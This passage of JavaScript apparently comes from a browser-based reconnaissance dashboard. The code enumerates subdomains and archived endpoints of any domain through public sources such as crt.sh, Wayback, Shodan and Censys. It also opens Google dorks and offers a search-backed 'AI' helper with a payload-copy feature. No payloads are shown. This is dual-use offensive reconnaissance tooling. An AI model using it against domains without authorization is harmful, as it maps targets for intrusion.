function partialEpTable() {
  const tb=document.getElementById("ep-tb");
  if (tb) tb.innerHTML=epRows(filteredEp());
  document.getElementById("ep-more")?.addEventListener("click",()=>{S.epPage++;partialEpTable();});
}
function updateDorkContainer() {
  const c=document.getElementById("dork-container");
  if (c) c.innerHTML=dorkGrid();
  bindDorkEvents();
}

function exportTxt(content,filename) {
  const a=document.createElement("a");
  a.href=URL.createObjectURL(new Blob([content],{type:"text/plain"}));
  a.download=filename; a.click(); URL.revokeObjectURL(a.href);
}

/* ── AI WEB SEARCH ── */
async function aiSearchWeb(query) {
  try {
    const url = `https://api.duckduckgo.com/?q=${encodeURIComponent(query)}&format=json&no_html=1&skip_disambig=1`;
    const r = await fetch(url, {signal: AbortSignal.timeout(9000)});
    return await r.json();
  } catch { return null; }
}

function formatWebResults(data, query) {
  if (!data) return aiSearchFallback(query);
  let html = "";
  let hasContent = false;

  if (data.Answer) {
    hasContent = true;
    html += `<div class="ai-section-title">Direct Answer</div>
      <div class="ai-info-block" style="color:var(--green);font-size:13px;padding:10px 14px">${data.Answer}</div>`;
  }

  if (data.AbstractText) {
    hasContent = true;
    const src = data.AbstractURL ? `<br><a href="${data.AbstractURL}" target="_blank" style="color:var(--cyan);font-size:10px;font-family:var(--mono)">→ ${data.AbstractSource || "Source"}</a>` : "";
    html += `<div class="ai-section-title">${data.Heading || "Summary"}</div>
      <div class="ai-info-block" style="font-size:12px;line-height:1.6">${data.AbstractText}${src}</div>`;
  }

  const topics = (data.RelatedTopics || [])
    .filter(t => t.Text && t.FirstURL && !t.Topics)
    .slice(0, 6);

  if (topics.length) {
    hasContent = true;
    html += `<div class="ai-section-title">Results</div>`;
    topics.forEach(t => {
      html += `<div class="ai-payload-item" style="cursor:default;flex-direction:column;align-items:flex-start;gap:4px">
        <div style="color:var(--text);font-size:12px;line-height:1.5">${t.Text}</div>
        <a href="${t.FirstURL}" target="_blank" style="color:var(--cyan);font-size:10px;font-family:var(--mono);word-break:break-all">→ ${t.FirstURL}</a>
      </div>`;
    });
  }

  const directResults = (data.Results || []).slice(0, 3);
  if (directResults.length) {
    hasContent = true;
    html += `<div class="ai-section-title">Top Links</div>`;
    directResults.forEach(r => {
      html += `<div class="ai-payload-item" style="cursor:default;flex-direction:column;align-items:flex-start;gap:4px">
        <a href="${r.FirstURL}" target="_blank" style="color:var(--green);font-size:12px">${r.Text}</a>
        <span style="color:var(--muted);font-size:10px;font-family:var(--mono)">${r.FirstURL}</span>
      </div>`;
    });
  }

  if (!hasContent) return aiSearchFallback(query);

  html += `<div style="margin-top:14px;padding-top:10px;border-top:1px solid rgba(99,179,255,0.12);display:flex;gap:14px;flex-wrap:wrap">
    <a href="https://www.google.com/search?q=${encodeURIComponent(query)}" target="_blank" style="color:var(--cyan);font-size:11px;font-family:var(--mono)">→ Google</a>
    <a href="https://duckduckgo.com/?q=${encodeURIComponent(query)}" target="_blank" style="color:var(--muted);font-size:11px;font-family:var(--mono)">→ DuckDuckGo</a>
  </div>`;
  return html;
}

function aiSearchFallback(query) {
  return `<div class="ai-info-block" style="font-size:12px">
    No direct results found. Search the web:
    <br><br>
    <a href="https://www.google.com/search?q=${encodeURIComponent(query)}" target="_blank" style="color:var(--cyan);font-family:var(--mono)">→ Google: "${query}"</a><br>
    <a href="https://duckduckgo.com/?q=${encodeURIComponent(query)}" target="_blank" style="color:var(--muted);font-family:var(--mono)">→ DuckDuckGo: "${query}"</a>
  </div>`;
}

/* ── AI SEND MESSAGE ── */
async function aiSend(text) {
  if (!text.trim() || S.aiTyping) return;
  S.aiMessages.push({role:"user",text:text.trim()});
  S.aiInput = "";
  S.aiTyping = true;
  render();

  // Try web search first
  const webData = await aiSearchWeb(text);
  let responseHtml;

  if (webData && (webData.AbstractText || webData.Answer || (webData.RelatedTopics||[]).length || (webData.Results||[]).length)) {
    responseHtml = formatWebResults(webData, text);
  } else {
    // Fallback: check local security KB
    const kb = aiGetResponse(text);
    responseHtml = kb ? aiFormatResponse(kb) : aiSearchFallback(text);
  }

  S.aiMessages.push({role:"bot",html:responseHtml});
  S.aiTyping = false;
  render();

  // Scroll to bottom
  setTimeout(()=>{
    const msgBox = document.getElementById("ai-messages");
    if (msgBox) msgBox.scrollTop = msgBox.scrollHeight;
  }, 50);
}

/* ── BIND EVENTS ── */
function bindDorkEvents() {
  // Dork run buttons
  document.querySelectorAll(".dork-run-btn").forEach(btn=>{
    btn.addEventListener("click",e=>{
      const cat=DORK_CATEGORIES.find(c=>c.id===e.currentTarget.dataset.cat);
      if (!cat) return;
      const dork=cat.dorks[parseInt(e.currentTarget.dataset.i)];
      if (!dork) return;
      window.open(`https://www.google.com/search?q=${encodeURIComponent(buildDork(dork.query))}`, "_blank", "noopener");
    });
  });
  // Dork copy buttons
  document.querySelectorAll(".dork-copy-btn").forEach(btn=>{
    btn.addEventListener("click",e=>{
      const cat=DORK_CATEGORIES.find(c=>c.id===e.currentTarget.dataset.cat);
      if (!cat) return;
      const dork=cat.dorks[parseInt(e.currentTarget.dataset.i)];
      if (!dork) return;
      navigator.clipboard.writeText(buildDork(dork.query)).then(()=>showToast("Dork copied!","success"));
    });
  });
  // Dork query click to copy
  document.querySelectorAll(".dork-query").forEach(el=>{
    el.addEventListener("click",()=>{
      const cat=DORK_CATEGORIES.find(c=>c.id===el.dataset.cat);
      if (!cat) return;
      const dork=cat.dorks[parseInt(el.dataset.i)];
      if (!dork) return;
      navigator.clipboard.writeText(buildDork(dork.query)).then(()=>showToast("Dork copied!","success"));
    });
  });
}

function bindEvents() {
  // Nav pills (desktop)
  document.querySelectorAll(".nav-pill").forEach(btn=>{
    btn.addEventListener("click",()=>{
      S.tab=btn.dataset.tab; S.drawerOpen=false;
      render();
    });
  });
  // Drawer nav items (mobile)
  document.querySelectorAll(".drawer-nav-item").forEach(btn=>{
    btn.addEventListener("click",()=>{
      S.tab=btn.dataset.tab; S.drawerOpen=false;
      document.getElementById("mobile-drawer")?.classList.remove("open");
      document.getElementById("hamburger-btn")?.classList.remove("open");
      render();
    });
  });
  // Hamburger
  const hb=document.getElementById("hamburger-btn");
  if (hb) {
    hb.addEventListener("click",()=>{
      S.drawerOpen=!S.drawerOpen;
      hb.classList.toggle("open",S.drawerOpen);
      document.getElementById("mobile-drawer")?.classList.toggle("open",S.drawerOpen);
    });
  }
  // Nav brand click to home
  document.getElementById("nav-brand")?.addEventListener("click",()=>{S.tab="subdomain";render();});
  // Update active nav state
  document.querySelectorAll(".nav-pill").forEach(btn=>btn.classList.toggle("active",btn.dataset.tab===S.tab));
  document.querySelectorAll(".drawer-nav-item").forEach(btn=>btn.classList.toggle("active",btn.dataset.tab===S.tab));

  /* ─ Subdomain tab ─ */
  const si=document.getElementById("sub-inp");
  if (si) {
    si.addEventListener("input",e=>{S.subDomain=e.target.value;});
    si.addEventListener("keydown",e=>{if(e.key==="Enter"&&!S.subScanning)startSub();});
  }
  document.getElementById("sub-btn")?.addEventListener("click",startSub);
  document.getElementById("sub-flt")?.addEventListener("input",e=>{S.subFilter=e.target.value;S.subPage=0;partialSubTable();});
  document.getElementById("sub-cp")?.addEventListener("click",()=>{
    if(!S.subResults.length){showToast("Nothing to copy.","error");return;}
    navigator.clipboard.writeText(S.subResults.map(r=>r.subdomain).join("\n")).then(()=>showToast("Copied to clipboard!","success"));
  });
  document.getElementById("sub-ex")?.addEventListener("click",()=>{
    if(!S.subResults.length){showToast("Nothing to export.","error");return;}
    exportTxt(S.subResults.map(r=>r.subdomain).join("\n"),`${S.subDomain}_subdomains.txt`);
    showToast(`Exported ${S.subResults.length} subdomains`,"success");
  });
  document.getElementById("sub-more")?.addEventListener("click",()=>{S.subPage++;partialSubTable();});

  // Sub source toggles
  document.querySelectorAll("#sub-src-row .source-toggle").forEach(lbl=>{
    lbl.addEventListener("click",()=>{
      const k=lbl.dataset.src;
      S.subSources[k]=!S.subSources[k];
      lbl.classList.toggle("active",S.subSources[k]);
    });
  });

  /* ─ Endpoint tab ─ */
  const ei=document.getElementById("ep-inp");
  if (ei) {
    ei.addEventListener("input",e=>{S.epDomain=e.target.value;});
    ei.addEventListener("keydown",e=>{if(e.key==="Enter"&&!S.epScanning)startEp();});
  }
  document.getElementById("ep-btn")?.addEventListener("click",startEp);
  document.getElementById("ep-flt")?.addEventListener("input",e=>{S.epFilter=e.target.value;S.epPage=0;partialEpTable();});
  document.getElementById("ep-cp")?.addEventListener("click",()=>{
    if(!S.epResults.length){showToast("Nothing to copy.","error");return;}
    navigator.clipboard.writeText(S.epResults.map(r=>r.url).join("\n")).then(()=>showToast("Copied!","success"));
  });
  document.getElementById("ep-ex")?.addEventListener("click",()=>{
    if(!S.epResults.length){showToast("Nothing to export.","error");return;}
    exportTxt(S.epResults.map(r=>r.url).join("\n"),`${S.epDomain}_endpoints.txt`);
    showToast(`Exported ${S.epResults.length} endpoints`,"success");
  });
  document.getElementById("ep-more")?.addEventListener("click",()=>{S.epPage++;partialEpTable();});

  // EP filter toggle
  document.getElementById("ep-ftb")?.addEventListener("click",e=>{
    e.stopPropagation();
    S.epFilterOpen=!S.epFilterOpen;
    render();
  });
  document.addEventListener("click",e=>{
    if (S.epFilterOpen && !e.target.closest("#epfw")) {
      S.epFilterOpen=false;
      render();
    }
  },{once:true,capture:false});
  document.getElementById("epfc")?.addEventListener("click",()=>{S.epChips.clear();S.epFilterOpen=false;render();});
  document.querySelectorAll(".ep-chip").forEach(ch=>{
    ch.addEventListener("click",e=>{
      const k=e.currentTarget.dataset.chip;
      S.epChips.has(k)?S.epChips.delete(k):S.epChips.add(k);
      render();
    });
  });

  // EP source toggles
  document.querySelectorAll("#ep-src-row .source-toggle").forEach(lbl=>{
    lbl.addEventListener("click",()=>{
      const k=lbl.dataset.src;
      S.epSources[k]=!S.epSources[k];
      lbl.classList.toggle("active",S.epSources[k]);
    });
  });

  /* ─ Dork tab ─ */
  document.getElementById("dk-domain")?.addEventListener("input",e=>{S.dorkDomain=e.target.value;updateDorkContainer();});
  document.getElementById("dk-search")?.addEventListener("input",e=>{S.dorkSearch=e.target.value;updateDorkContainer();});
  bindDorkEvents();

  /* ─ AI tab ─ */
  const aiInp=document.getElementById("ai-input");
  if (aiInp) {
    aiInp.addEventListener("input",e=>{S.aiInput=e.target.value;});
    aiInp.addEventListener("keydown",e=>{
      if(e.key==="Enter"&&!S.aiTyping){
        const v=aiInp.value.trim();
        if(v){aiSend(v);}
      }
    });
  }
  document.getElementById("ai-send")?.addEventListener("click",()=>{
    const aiInp=document.getElementById("ai-input");
    if(aiInp&&aiInp.value.trim()){aiSend(aiInp.value.trim());}
  });

  // Quick buttons
  document.querySelectorAll(".ai-quick-btn").forEach(btn=>{
    btn.addEventListener("click",()=>aiSend(btn.dataset.query));
  });
  // Capability cards
  document.querySelectorAll(".ai-cap-card").forEach(card=>{
    card.addEventListener("click",()=>aiSend(card.dataset.query));
  });

  // AI payload copy
  document.querySelectorAll(".ai-payload-item").forEach(item=>{
    item.addEventListener("click",()=>{
      const payload=item.dataset.payload;
      if(payload){navigator.clipboard.writeText(payload).then(()=>showToast("Payload copied!","success"));}
    });
  });
}

/* ─ Subdomain scan ─ */
async function startSub() {
  const domain=S.subDomain.trim().replace(/^https?:\/\//,"").replace(/\/.*/,"");
  if (!domain) { showToast("Please enter a domain.","error"); return; }
  const sources=Object.entries(S.subSources).filter(([,v])=>v).map(([k])=>k);
  if (!sources.length) { showToast("Enable at least one source.","error"); return; }
  S.subDomain=domain; S.subResults=[]; S.subScanning=true; S.subProgress=0;
  S.subShowProgress=true; S.subSrcStatus={}; S.subPage=0; S.subFilter="";
  sources.forEach(k=>{S.subSrcStatus[k]={state:"loading",count:0};});
  render();

  const fetchers={
    hackertarget:fetchHackerTarget,urlscan:fetchURLScan,crtsh:fetchCrtSh,
    jldc:fetchJLDC,certspotter:fetchCertSpotter,rapiddns:fetchRapidDNS,
    dnsrepo:fetchDNSRepo,wayback_sub:fetchWaybackSub,github:fetchGitHub,
    shodan:fetchShodan,censys:fetchCensys,
  };
  const seen=new Set();
  let done=0;

  const tasks=sources.map(async k=>{
    try {
      const results=await fetchers[k](domain);
      const unique=results.filter(r=>{if(seen.has(r.subdomain))return false;seen.add(r.subdomain);return true;});
      S.subResults.push(...unique);
      S.subSrcStatus[k]={state:"done",count:unique.length};
    } catch(e) {
      S.subSrcStatus[k]={state:e.quota?"quota":"error",count:0};
    }
    done++;
    S.subProgress=Math.round((done/sources.length)*100);
    const tb=document.getElementById("sub-tb");
    if (tb) tb.innerHTML=subRows(filteredSub());
    const pw=document.querySelector(".progress-wrap");
    if (pw) pw.innerHTML=progH(S.subSrcStatus,S.subProgress).replace(/^<div[^>]*>/,"").replace(/<\/div>$/,"");
    const sv=document.querySelector(".stat-value");
    if (sv) document.querySelectorAll(".stat-value")[0].textContent=S.subResults.length;
  });

  await Promise.allSettled(tasks);
  S.subScanning=false;
  showToast(`Found ${S.subResults.length} subdomains`,"success");
  render();
}

/* ─ Endpoint scan ─ */
async function startEp() {
  const domain=S.epDomain.trim().replace(/^https?:\/\//,"").replace(/\/.*/,"");
  if (!domain) { showToast("Please enter a domain.","error"); return; }
  const sources=Object.entries(S.epSources).filter(([,v])=>v).map(([k])=>k);
  if (!sources.length) { showToast("Enable at least one source.","error"); return; }
  S.epDomain=domain; S.epResults=[]; S.epScanning=true; S.epProgress=0;
  S.epShowProgress=true; S.epSrcStatus={}; S.epPage=0; S.epFilter=""; S.epStatsDomain=domain;
  sources.forEach(k=>{S.epSrcStatus[k]={state:"loading",count:0};});
  render();

  const fetchers={wayback:fetchWayback,commoncrawl:fetchCommonCrawl,otx:fetchOTX,urlscan:fetchURLScanEp};
  const seen=new Set();
  let done=0;

  const tasks=sources.map(async k=>{
    try {
      const results=await fetchers[k](domain);
      const unique=results.filter(r=>{if(seen.has(r.url))return false;seen.add(r.url);return true;});
      S.epResults.push(...unique);
      S.epSrcStatus[k]={state:"done",count:unique.length};
    } catch {
      S.epSrcStatus[k]={state:"error",count:0};
    }
    done++;
    S.epProgress=Math.round((done/sources.length)*100);
    const tb=document.getElementById("ep-tb");
    if (tb) tb.innerHTML=epRows(filteredEp());
  });

  await Promise.allSettled(tasks);
  S.epScanning=false;
  showToast(`Found ${S.epResults.length} endpoints`,"success");
  render();
}

/* ── BOOT ── */
document.addEventListener("DOMContentLoaded",()=>{
  initCanvas();
  render();
});

// Pause animations when tab is hidden to save CPU
document.addEventListener("visibilitychange",()=>{
  if (document.hidden) {
    document.getElementById("bg-canvas")?.style && (document.getElementById("bg-canvas").style.display="none");
  } else {
    document.getElementById("bg-canvas")?.style && (document.getElementById("bg-canvas").style.display="");
  }
});
